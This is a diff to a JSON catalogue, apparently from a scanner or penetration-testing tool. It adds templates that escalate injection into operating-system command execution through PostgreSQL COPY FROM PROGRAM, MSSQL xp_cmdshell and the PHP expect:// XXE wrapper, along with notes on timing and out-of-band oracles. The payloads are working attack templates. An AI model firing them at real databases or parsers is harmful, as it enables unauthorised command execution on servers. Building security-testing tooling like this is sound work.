@@ -665,5 +665,49 @@
       "notes": "Thymeleaf only evaluates an expression inside its inlining brackets; a bare ${a*b} in template text is emitted verbatim.",
       "verified": "thymeleaf 3.1.2: ${a*b} -> literal '${a*b}'; [[${a*b}]] -> '2070761401'. The __${...}__ preprocessing form was also tried and did NOT evaluate standalone, so it is deliberately not shipped."
     }
+  },
+  "bridges": {
+    "postgres_copy_program": {
+      "engines": [
+        "postgresql"
+      ],
+      "sink_env": "unix",
+      "safety": "stateful",
+      "requires": [
+        "superuser, or a role in pg_execute_server_program"
+      ],
+      "template": "DROP TABLE IF EXISTS rk_{token}; CREATE TABLE rk_{token}(o text); COPY rk_{token} FROM PROGRAM '__CMD__'; SELECT o FROM rk_{token};",
+      "cleanup": "DROP TABLE IF EXISTS rk_{token};",
+      "notes": "COPY FROM PROGRAM runs its argument through /bin/sh on the database server, so a Unix command core rides it unchanged. It creates a table, which is why this bridge is stateful and carries its own DROP. The leading DROP IF EXISTS is not tidiness: the timing oracle fires the same bridge twice against one table name (0s then Ns), and without it the second CREATE fails, the statement aborts and the delay never happens -- the regression would then read as no delay on a target that is executing. The SELECT is there for the case where the driver returns the last result set to the application; do not rely on it. The reliable oracles here are time (the COPY blocks until the program exits) and oob (the program itself calls back), and both work with nothing rendered.",
+      "verified": "not validated against a live PostgreSQL here (no container runtime in the build environment); the syntax is PostgreSQL 9.3+ documented behaviour"
+    },
+    "mssql_xp_cmdshell": {
+      "engines": [
+        "mssql"
+      ],
+      "sink_env": "windows",
+      "safety": "intrusive",
+      "requires": [
+        "sysadmin, and xp_cmdshell enabled"
+      ],
+      "template": "EXEC master..xp_cmdshell '__CMD__';",
+      "cleanup": null,
+      "notes": "xp_cmdshell hands its argument to cmd.exe, so the command core must be the cmd.exe dialect -- a POSIX $((a+b)) is inert text there. Creates nothing, so there is nothing to clean up; it is intrusive rather than stateful because it executes a command, not because it leaves an object behind.",
+      "verified": "not validated against a live SQL Server here; documented behaviour of xp_cmdshell"
+    },
+    "xxe_expect": {
+      "engines": [
+        "php"
+      ],
+      "sink_env": "unix",
+      "safety": "intrusive",
+      "requires": [
+        "PHP with the expect extension loaded, and an XML parser with external entities enabled"
+      ],
+      "template": "<?xml version=\"1.0\"?><!DOCTYPE rk [<!ENTITY rk SYSTEM \"expect://__CMD__\">]><rk>&rk;</rk>",
+      "cleanup": null,
+      "notes": "The expect:// stream wrapper executes its URI through a shell and yields the output as the entity's value, so a document that renders the entity returns the command output directly. The extension is rarely installed, which is exactly why this is opt-in rather than part of a default run.",
+      "verified": "not validated here; documented behaviour of the PHP expect stream wrapper"
+    }
   }
 }
